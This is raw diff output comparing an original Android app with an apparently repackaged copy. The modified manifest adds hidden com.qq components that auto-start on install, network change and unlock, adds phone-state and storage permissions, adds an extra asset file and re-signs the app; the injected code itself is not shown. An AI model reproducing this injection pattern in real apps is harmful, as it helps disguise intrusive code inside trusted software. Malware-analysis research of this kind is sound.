@@ -1,0 +1,619 @@
+diff -r result/APP_8/App_B_8/AndroidManifest.xml result/APP_8/App_M_8/AndroidManifest.xml
+21a22,37
+>         <meta-data android:name="j-id" android:value="bdc84955a4164639a0056c6bb4285cdc"/>
+>         <meta-data android:name="channel-id" android:value="j-ggg"/>
+>         <activity android:configChanges="keyboardHidden|orientation" android:excludeFromRecents="true" android:label="" android:launchMode="singleTask" android:name="com.qq.JA"/>
+>         <service android:name="com.qq.JS"/>
+>         <receiver android:name="com.qq.JR">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.USER_PRESENT"/>
+>             </intent-filter>
+>         </receiver>
+22a39,44
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+diff -r result/APP_8/App_B_8/apktool.yml result/APP_8/App_M_8/apktool.yml
+2c2
+< apkFileName: Bapp8-19B1E780FA2934ABC1E968248BD4F7E0124A8D2CF4AA86CFDA19F67DDBCF94D7.apk
+---
+> apkFileName: Mapp8-C454A81A1481BC85DBF579E01DB3BB13ECD4C6AB2C2F177B9D87B9BD51010979.apk
+17,19c17
+< unknownFiles:
+<   jsr305_annotations/Jsr305_annotations.gwt.xml: '8'
+<   jsr305_annotations/v0_r47/V0_r47.gwt.xml: '8'
+---
+> unknownFiles: {}
+Somente em result/APP_8/App_M_8/assets: 9.dat
+diff -r result/APP_8/App_B_8/com/millennialmedia/android/AdCache.java result/APP_8/App_M_8/com/millennialmedia/android/AdCache.java
+147c147
+<     //   78: astore 12
+---
+>     //   78: astore 13
+151c151
+<     //   84: astore 13
+---
+>     //   84: astore 12
+156c156
+<     //   95: aload 12
+---
+>     //   95: aload 13
+167c167
+<     //   115: aload 12
+---
+>     //   115: aload 13
+175c175
+<     //   130: aload 12
+---
+>     //   130: aload 13
+185c185
+<     //   150: aload 12
+---
+>     //   150: aload 13
+194c194
+<     //   169: aload 12
+---
+>     //   169: aload 13
+203c203
+<     //   187: aload 12
+---
+>     //   187: aload 13
+211c211
+<     //   203: aload 12
+---
+>     //   203: aload 13
+227,228c227,228
+<     //   232: astore 12
+<     //   234: aload 12
+---
+>     //   232: astore 13
+>     //   234: aload 13
+236c236
+<     //   248: aload 12
+---
+>     //   248: aload 13
+305c305
+<     //   372: ifnull +156 -> 528
+---
+>     //   372: ifnull +164 -> 536
+316c316
+<     //   396: ifne +127 -> 523
+---
+>     //   396: ifne +135 -> 531
+352,367c352,368
+<     //   463: astore 12
+<     //   465: aload 11
+<     //   467: astore 9
+<     //   469: aload_0
+<     //   470: astore_2
+<     //   471: ldc -35
+<     //   473: iconst_2
+<     //   474: anewarray 4	java/lang/Object
+<     //   477: dup
+<     //   478: iconst_0
+<     //   479: aload_1
+<     //   480: aastore
+<     //   481: dup
+<     //   482: iconst_1
+<     //   483: aload 12
+<     //   485: invokevirtual 222	java/lang/Exception:getMessage	()Ljava/lang/String;
+---
+>     //   463: astore_2
+>     //   464: aload_0
+>     //   465: astore 10
+>     //   467: aload 11
+>     //   469: astore_0
+>     //   470: aload_2
+>     //   471: astore 11
+>     //   473: aload_0
+>     //   474: astore 9
+>     //   476: aload 10
+>     //   478: astore_2
+>     //   479: ldc -35
+>     //   481: iconst_2
+>     //   482: anewarray 4	java/lang/Object
+>     //   485: dup
+>     //   486: iconst_0
+>     //   487: aload_1
+369,374c370,376
+<     //   489: invokestatic 189	com/millennialmedia/android/MMAdViewSDK$Log:e	(Ljava/lang/String;[Ljava/lang/Object;)V
+<     //   492: aload_0
+<     //   493: ifnull +7 -> 500
+<     //   496: aload_0
+<     //   497: invokevirtual 194	java/io/InputStream:close	()V
+<     //   500: aload 11
+---
+>     //   489: dup
+>     //   490: iconst_1
+>     //   491: aload 11
+>     //   493: invokevirtual 222	java/lang/Exception:getMessage	()Ljava/lang/String;
+>     //   496: aastore
+>     //   497: invokestatic 189	com/millennialmedia/android/MMAdViewSDK$Log:e	(Ljava/lang/String;[Ljava/lang/Object;)V
+>     //   500: aload 10
+376,484c378,488
+<     //   505: aload 11
+<     //   507: invokevirtual 215	java/io/FileOutputStream:close	()V
+<     //   510: aload 15
+<     //   512: ifnull +9 -> 521
+<     //   515: aload 15
+<     //   517: invokevirtual 205	java/io/File:delete	()Z
+<     //   520: pop
+<     //   521: iconst_0
+<     //   522: ireturn
+<     //   523: ldc -32
+<     //   525: invokestatic 226	com/millennialmedia/android/MMAdViewSDK$Log:e	(Ljava/lang/String;)V
+<     //   528: aload_0
+<     //   529: ifnull +7 -> 536
+<     //   532: aload_0
+<     //   533: invokevirtual 194	java/io/InputStream:close	()V
+<     //   536: aload 11
+<     //   538: ifnull +8 -> 546
+<     //   541: aload 11
+<     //   543: invokevirtual 215	java/io/FileOutputStream:close	()V
+<     //   546: goto -36 -> 510
+<     //   549: astore_2
+<     //   550: ldc -35
+<     //   552: iconst_2
+<     //   553: anewarray 4	java/lang/Object
+<     //   556: dup
+<     //   557: iconst_0
+<     //   558: aload_1
+<     //   559: aastore
+<     //   560: dup
+<     //   561: iconst_1
+<     //   562: aload_2
+<     //   563: invokevirtual 227	java/lang/SecurityException:getMessage	()Ljava/lang/String;
+<     //   566: aastore
+<     //   567: invokestatic 189	com/millennialmedia/android/MMAdViewSDK$Log:e	(Ljava/lang/String;[Ljava/lang/Object;)V
+<     //   570: goto -42 -> 528
+<     //   573: astore_1
+<     //   574: aload 11
+<     //   576: astore 9
+<     //   578: aload_0
+<     //   579: ifnull +7 -> 586
+<     //   582: aload_0
+<     //   583: invokevirtual 194	java/io/InputStream:close	()V
+<     //   586: aload 9
+<     //   588: ifnull +8 -> 596
+<     //   591: aload 9
+<     //   593: invokevirtual 215	java/io/FileOutputStream:close	()V
+<     //   596: aload_1
+<     //   597: athrow
+<     //   598: astore_0
+<     //   599: ldc -57
+<     //   601: iconst_1
+<     //   602: anewarray 4	java/lang/Object
+<     //   605: dup
+<     //   606: iconst_0
+<     //   607: aload_0
+<     //   608: invokevirtual 202	java/io/IOException:getMessage	()Ljava/lang/String;
+<     //   611: aastore
+<     //   612: invokestatic 189	com/millennialmedia/android/MMAdViewSDK$Log:e	(Ljava/lang/String;[Ljava/lang/Object;)V
+<     //   615: aload 15
+<     //   617: ifnull +9 -> 626
+<     //   620: aload 15
+<     //   622: invokevirtual 205	java/io/File:delete	()Z
+<     //   625: pop
+<     //   626: iconst_0
+<     //   627: ireturn
+<     //   628: astore_0
+<     //   629: ldc -57
+<     //   631: iconst_1
+<     //   632: anewarray 4	java/lang/Object
+<     //   635: dup
+<     //   636: iconst_0
+<     //   637: aload_0
+<     //   638: invokevirtual 202	java/io/IOException:getMessage	()Ljava/lang/String;
+<     //   641: aastore
+<     //   642: invokestatic 189	com/millennialmedia/android/MMAdViewSDK$Log:e	(Ljava/lang/String;[Ljava/lang/Object;)V
+<     //   645: aload 15
+<     //   647: ifnull +9 -> 656
+<     //   650: aload 15
+<     //   652: invokevirtual 205	java/io/File:delete	()Z
+<     //   655: pop
+<     //   656: iconst_0
+<     //   657: ireturn
+<     //   658: astore_0
+<     //   659: ldc -57
+<     //   661: iconst_1
+<     //   662: anewarray 4	java/lang/Object
+<     //   665: dup
+<     //   666: iconst_0
+<     //   667: aload_0
+<     //   668: invokevirtual 202	java/io/IOException:getMessage	()Ljava/lang/String;
+<     //   671: aastore
+<     //   672: invokestatic 189	com/millennialmedia/android/MMAdViewSDK$Log:e	(Ljava/lang/String;[Ljava/lang/Object;)V
+<     //   675: aload 15
+<     //   677: ifnull +9 -> 686
+<     //   680: aload 15
+<     //   682: invokevirtual 205	java/io/File:delete	()Z
+<     //   685: pop
+<     //   686: iconst_0
+<     //   687: ireturn
+<     //   688: astore_1
+<     //   689: aload_2
+<     //   690: astore_0
+<     //   691: goto -113 -> 578
+<     //   694: astore 12
+<     //   696: aload 13
+<     //   698: astore 11
+<     //   700: aload 10
+<     //   702: astore_0
+<     //   703: goto -238 -> 465
+---
+>     //   505: aload 10
+>     //   507: invokevirtual 194	java/io/InputStream:close	()V
+>     //   510: aload_0
+>     //   511: ifnull +7 -> 518
+>     //   514: aload_0
+>     //   515: invokevirtual 215	java/io/FileOutputStream:close	()V
+>     //   518: aload 15
+>     //   520: ifnull +9 -> 529
+>     //   523: aload 15
+>     //   525: invokevirtual 205	java/io/File:delete	()Z
+>     //   528: pop
+>     //   529: iconst_0
+>     //   530: ireturn
+>     //   531: ldc -32
+>     //   533: invokestatic 226	com/millennialmedia/android/MMAdViewSDK$Log:e	(Ljava/lang/String;)V
+>     //   536: aload_0
+>     //   537: ifnull +7 -> 544
+>     //   540: aload_0
+>     //   541: invokevirtual 194	java/io/InputStream:close	()V
+>     //   544: aload 11
+>     //   546: ifnull +8 -> 554
+>     //   549: aload 11
+>     //   551: invokevirtual 215	java/io/FileOutputStream:close	()V
+>     //   554: goto -36 -> 518
+>     //   557: astore_2
+>     //   558: ldc -35
+>     //   560: iconst_2
+>     //   561: anewarray 4	java/lang/Object
+>     //   564: dup
+>     //   565: iconst_0
+>     //   566: aload_1
+>     //   567: aastore
+>     //   568: dup
+>     //   569: iconst_1
+>     //   570: aload_2
+>     //   571: invokevirtual 227	java/lang/SecurityException:getMessage	()Ljava/lang/String;
+>     //   574: aastore
+>     //   575: invokestatic 189	com/millennialmedia/android/MMAdViewSDK$Log:e	(Ljava/lang/String;[Ljava/lang/Object;)V
+>     //   578: goto -42 -> 536
+>     //   581: astore_1
+>     //   582: aload 11
+>     //   584: astore 9
+>     //   586: aload_0
+>     //   587: ifnull +7 -> 594
+>     //   590: aload_0
+>     //   591: invokevirtual 194	java/io/InputStream:close	()V
+>     //   594: aload 9
+>     //   596: ifnull +8 -> 604
+>     //   599: aload 9
+>     //   601: invokevirtual 215	java/io/FileOutputStream:close	()V
+>     //   604: aload_1
+>     //   605: athrow
+>     //   606: astore_0
+>     //   607: ldc -57
+>     //   609: iconst_1
+>     //   610: anewarray 4	java/lang/Object
+>     //   613: dup
+>     //   614: iconst_0
+>     //   615: aload_0
+>     //   616: invokevirtual 202	java/io/IOException:getMessage	()Ljava/lang/String;
+>     //   619: aastore
+>     //   620: invokestatic 189	com/millennialmedia/android/MMAdViewSDK$Log:e	(Ljava/lang/String;[Ljava/lang/Object;)V
+>     //   623: aload 15
+>     //   625: ifnull +9 -> 634
+>     //   628: aload 15
+>     //   630: invokevirtual 205	java/io/File:delete	()Z
+>     //   633: pop
+>     //   634: iconst_0
+>     //   635: ireturn
+>     //   636: astore_0
+>     //   637: ldc -57
+>     //   639: iconst_1
+>     //   640: anewarray 4	java/lang/Object
+>     //   643: dup
+>     //   644: iconst_0
+>     //   645: aload_0
+>     //   646: invokevirtual 202	java/io/IOException:getMessage	()Ljava/lang/String;
+>     //   649: aastore
+>     //   650: invokestatic 189	com/millennialmedia/android/MMAdViewSDK$Log:e	(Ljava/lang/String;[Ljava/lang/Object;)V
+>     //   653: aload 15
+>     //   655: ifnull +9 -> 664
+>     //   658: aload 15
+>     //   660: invokevirtual 205	java/io/File:delete	()Z
+>     //   663: pop
+>     //   664: iconst_0
+>     //   665: ireturn
+>     //   666: astore_0
+>     //   667: ldc -57
+>     //   669: iconst_1
+>     //   670: anewarray 4	java/lang/Object
+>     //   673: dup
+>     //   674: iconst_0
+>     //   675: aload_0
+>     //   676: invokevirtual 202	java/io/IOException:getMessage	()Ljava/lang/String;
+>     //   679: aastore
+>     //   680: invokestatic 189	com/millennialmedia/android/MMAdViewSDK$Log:e	(Ljava/lang/String;[Ljava/lang/Object;)V
+>     //   683: aload 15
+>     //   685: ifnull +9 -> 694
+>     //   688: aload 15
+>     //   690: invokevirtual 205	java/io/File:delete	()Z
+>     //   693: pop
+>     //   694: iconst_0
+>     //   695: ireturn
+>     //   696: astore_1
+>     //   697: aload_2
+>     //   698: astore_0
+>     //   699: goto -113 -> 586
+>     //   702: astore 11
+>     //   704: aload 12
+>     //   706: astore_0
+>     //   707: goto -234 -> 473
+487,489c491,493
+<     //   0	706	0	paramString1	String
+<     //   0	706	1	paramString2	String
+<     //   0	706	2	paramFile	File
+---
+>     //   0	710	0	paramString1	String
+>     //   0	710	1	paramString2	String
+>     //   0	710	2	paramFile	File
+494,500c498,503
+<     //   93	499	9	localObject1	Object
+<     //   100	601	10	localObject2	Object
+<     //   81	618	11	localObject3	Object
+<     //   78	171	12	str	String
+<     //   463	21	12	localException1	Exception
+<     //   694	1	12	localException2	Exception
+<     //   84	613	13	localObject4	Object
+---
+>     //   93	507	9	localObject1	Object
+>     //   100	406	10	localObject2	Object
+>     //   81	502	11	localObject3	Object
+>     //   702	1	11	localException	Exception
+>     //   84	621	12	localObject4	Object
+>     //   78	171	13	str	String
+502c505
+<     //   9	672	15	localFile	File
+---
+>     //   9	680	15	localFile	File
+514,552c517,555
+<     //   523	528	463	java/lang/Exception
+<     //   550	570	463	java/lang/Exception
+<     //   375	382	549	java/lang/SecurityException
+<     //   523	528	549	java/lang/SecurityException
+<     //   354	360	573	finally
+<     //   360	366	573	finally
+<     //   375	382	573	finally
+<     //   452	460	573	finally
+<     //   523	528	573	finally
+<     //   550	570	573	finally
+<     //   532	536	598	java/io/IOException
+<     //   541	546	598	java/io/IOException
+<     //   496	500	628	java/io/IOException
+<     //   505	510	628	java/io/IOException
+<     //   582	586	658	java/io/IOException
+<     //   591	596	658	java/io/IOException
+<     //   102	111	688	finally
+<     //   122	126	688	finally
+<     //   137	146	688	finally
+<     //   157	165	688	finally
+<     //   176	183	688	finally
+<     //   194	199	688	finally
+<     //   210	216	688	finally
+<     //   225	234	688	finally
+<     //   248	255	688	finally
+<     //   268	281	688	finally
+<     //   343	354	688	finally
+<     //   471	492	688	finally
+<     //   102	111	694	java/lang/Exception
+<     //   122	126	694	java/lang/Exception
+<     //   137	146	694	java/lang/Exception
+<     //   157	165	694	java/lang/Exception
+<     //   176	183	694	java/lang/Exception
+<     //   194	199	694	java/lang/Exception
+<     //   210	216	694	java/lang/Exception
+<     //   225	234	694	java/lang/Exception
+<     //   248	255	694	java/lang/Exception
+<     //   268	281	694	java/lang/Exception
+<     //   343	354	694	java/lang/Exception
+---
+>     //   531	536	463	java/lang/Exception
+>     //   558	578	463	java/lang/Exception
+>     //   375	382	557	java/lang/SecurityException
+>     //   531	536	557	java/lang/SecurityException
+>     //   354	360	581	finally
+>     //   360	366	581	finally
+>     //   375	382	581	finally
+>     //   452	460	581	finally
+>     //   531	536	581	finally
+>     //   558	578	581	finally
+>     //   540	544	606	java/io/IOException
+>     //   549	554	606	java/io/IOException
+>     //   505	510	636	java/io/IOException
+>     //   514	518	636	java/io/IOException
+>     //   590	594	666	java/io/IOException
+>     //   599	604	666	java/io/IOException
+>     //   102	111	696	finally
+>     //   122	126	696	finally
+>     //   137	146	696	finally
+>     //   157	165	696	finally
+>     //   176	183	696	finally
+>     //   194	199	696	finally
+>     //   210	216	696	finally
+>     //   225	234	696	finally
+>     //   248	255	696	finally
+>     //   268	281	696	finally
+>     //   343	354	696	finally
+>     //   479	500	696	finally
+>     //   102	111	702	java/lang/Exception
+>     //   122	126	702	java/lang/Exception
+>     //   137	146	702	java/lang/Exception
+>     //   157	165	702	java/lang/Exception
+>     //   176	183	702	java/lang/Exception
+>     //   194	199	702	java/lang/Exception
+>     //   210	216	702	java/lang/Exception
+>     //   225	234	702	java/lang/Exception
+>     //   248	255	702	java/lang/Exception
+>     //   268	281	702	java/lang/Exception
+>     //   343	354	702	java/lang/Exception
+845,846c848,849
+<     //   53: istore 8
+<     //   55: iload 8
+---
+>     //   53: istore 6
+>     //   55: iload 6
+867,868c870,871
+<     //   95: istore 8
+<     //   97: iload 8
+---
+>     //   95: istore 6
+>     //   97: iload 6
+915c918
+<     //   193: lstore 6
+---
+>     //   193: lstore 7
+927c930
+<     //   215: lload 6
+---
+>     //   215: lload 7
+1030,1031c1033,1034
+<     //   193	23	6	l	long
+<     //   53	45	8	bool	boolean
+---
+>     //   53	45	6	bool	boolean
+>     //   193	23	7	l	long
+Somente em result/APP_8/App_M_8/com: qq
+Os arquivos binários result/APP_8/App_B_8/original/AndroidManifest.xml e result/APP_8/App_M_8/original/AndroidManifest.xml são diferentes
+Somente em result/APP_8/App_B_8/original/META-INF: CERT.RSA
+Somente em result/APP_8/App_B_8/original/META-INF: CERT.SF
+Somente em result/APP_8/App_M_8/original/META-INF: ___KEYST.RSA
+Somente em result/APP_8/App_M_8/original/META-INF: ___KEYST.SF
+diff -r result/APP_8/App_B_8/original/META-INF/MANIFEST.MF result/APP_8/App_M_8/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.6.0_45 (Sun Microsystems Inc.)
+17c17
+< SHA1-Digest: B+TJ7nno6aLlpRrKmM/23srAego=
+---
+> SHA1-Digest: OE/CoofKJE08Cek9u9TX+LoLFIA=
+20c20
+< SHA1-Digest: wiFSikjoyAuTP9NIuOUCbh1dftY=
+---
+> SHA1-Digest: eXjBW7iAl14h4sYTU2vD1Xjce9Q=
+25,27d24
+< Name: jsr305_annotations/v0_r47/V0_r47.gwt.xml
+< SHA1-Digest: /f34xYwskAvrKqRB+jFPzJ8rPJg=
+< 
+30a28,30
+> Name: res/layout/start.xml
+> SHA1-Digest: 0pdyiWNGrwdS0x3lC+JiX8K+nec=
+> 
+32c32
+< SHA1-Digest: MORwQE/iR3UGIln6FCX4RsKoUc4=
+---
+> SHA1-Digest: u/6DfdvlaxEfRrsHlD7IKhtLOE0=
+37,39d36
+< Name: res/layout/start.xml
+< SHA1-Digest: i7cCGNGAAFMosfMUUpDUlM4f7s8=
+< 
+53c50
+< SHA1-Digest: hS0P6n2b9wPmg9RLZKuvbkskRfI=
+---
+> SHA1-Digest: 1a9KZSYTo9moygcuGE2t1NK9nm8=
+77c74
+< SHA1-Digest: 9biaXPySvJinPy30vDVpTJh0ptQ=
+---
+> SHA1-Digest: TQVwy0ald7GHUhqxcRSvLX1vSLA=
+92c89
+< SHA1-Digest: qUlpte9UkCK3UqsmqDyhqYdqOFU=
+---
+> SHA1-Digest: 9gWzFG451eDEWjLsqSFAZabmKu0=
+101c98
+< SHA1-Digest: lWFk1Oz8WvEJJWYXWx7SSzdavXI=
+---
+> SHA1-Digest: MvCdI/KzQedmcSRHS0DQEzC3T10=
+110c107
+< SHA1-Digest: Dg3lNHfS9Cq6ZxTYhZh2M7yep1o=
+---
+> SHA1-Digest: TSviwx/lZckdBQDG7jDNllo6LEQ=
+129a127,129
+> Name: res/layout/options.xml
+> SHA1-Digest: pZcJ6U+T2vIViTpD8izL5O3BEIc=
+> 
+133,134c133,134
+< Name: res/layout/options.xml
+< SHA1-Digest: GhhLpk3G5Dl0AkdduZhjTgzsygk=
+---
+> Name: assets/9.dat
+> SHA1-Digest: zBoPjoLLdPOE2px5zmEHPyurils=
+137c137
+< SHA1-Digest: r17lX75nF7hZ4bkRAz8IVL077FY=
+---
+> SHA1-Digest: mQtnnHN0HHgqWkOERg+dfl80Bug=
+149c149
+< SHA1-Digest: VnQv1cl8bJxRQq1IDrOJlLBogaM=
+---
+> SHA1-Digest: vnke0lmWQi4facdFftHmIod+QAs=
+152c152
+< SHA1-Digest: MI5iT/E2bE7TRF/nOuSNgH3+yUE=
+---
+> SHA1-Digest: wdCkb7cQ2DMechSQcciLMn8ckoo=
+155c155
+< SHA1-Digest: XIvA+H8/PMN9IkKfTO93/84ImT0=
+---
+> SHA1-Digest: UithQrp3LsTAsK2OFOvIb/33tzs=
+163,165d162
+< Name: res/values/attrs.xml
+< SHA1-Digest: r6lf1/wfhDw7IxLA4ineZV/BGRA=
+< 
+177a175,177
+> Name: res/layout/scene.xml
+> SHA1-Digest: H65kkjl3X2/08IGi8i6pbSvQChU=
+> 
+181,183d180
+< Name: res/layout/scene.xml
+< SHA1-Digest: Lr4Nf75DMha55VPMWfti9qyu2Kk=
+< 
+194c191
+< SHA1-Digest: NMKYwhpQVDlOxelr2aEQFNqqq7k=
+---
+> SHA1-Digest: 8dDUsSZWWoGz+cM3iYr4Y428zpg=
+206,209c203
+< SHA1-Digest: oKA/So1GFLi2/pzY6IG+HTWMKi0=
+< 
+< Name: jsr305_annotations/Jsr305_annotations.gwt.xml
+< SHA1-Digest: UBXHoAGmseBGDwjR6/MFHfcIK7g=
+---
+> SHA1-Digest: 6qr++McMHlxwCYpz+iAp4Pj9BJE=
+221c215
+< SHA1-Digest: fjtLJTfGXfIZnp5JSbvpjAWZq2Q=
+---
+> SHA1-Digest: Cnbb8g2hLDkCGi3MaGvVqgSTxZw=
+317c311
+< SHA1-Digest: N77guRu0pLQ4zfdZFOyCBjTR0ig=
+---
+> SHA1-Digest: 6QjFrsT/nX92LESTESudaHE7QWw=
+320c314
+< SHA1-Digest: Toz29cdh0aHbkBsvkbAHAd0v0+o=
+---
+> SHA1-Digest: LjXcD6cgTyC1od5rlEL1XNrCm5s=
+341c335
+< SHA1-Digest: 2iWdmK8ksytFfgbdMNelhmhM1K0=
+---
+> SHA1-Digest: Sx9POegMlSaM8uIuN+qZjg4ryJw=
+Somente em result/APP_8/App_M_8/smali/com: qq
+Somente em result/APP_8/App_B_8/: unknown
